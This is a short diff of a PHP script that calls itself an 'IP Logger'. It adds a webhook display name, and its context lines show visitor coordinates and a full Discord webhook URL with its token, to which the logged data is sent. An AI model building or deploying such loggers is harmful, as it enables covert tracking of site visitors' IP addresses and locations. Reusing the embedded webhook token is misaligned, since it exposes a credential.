@@ -24,6 +24,8 @@ $COORD = "$Info->lat, $Info->lon"; // Coordinates
 //Variables
 $Webhook    = "https://discord.com/api/webhooks/946923655361875978/TWzt12yPROjSmSClf3M8q5L8F7nTNyR_zvSohQ1jiuQno9gWRiOqlEHylatsNeudRqQ7"; //Webhook here.
 
+$WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
+
 //JS we are going to send to the webhook.
 $JS = array(
     'username'   => "$WebhookTag - IP Logger" , 
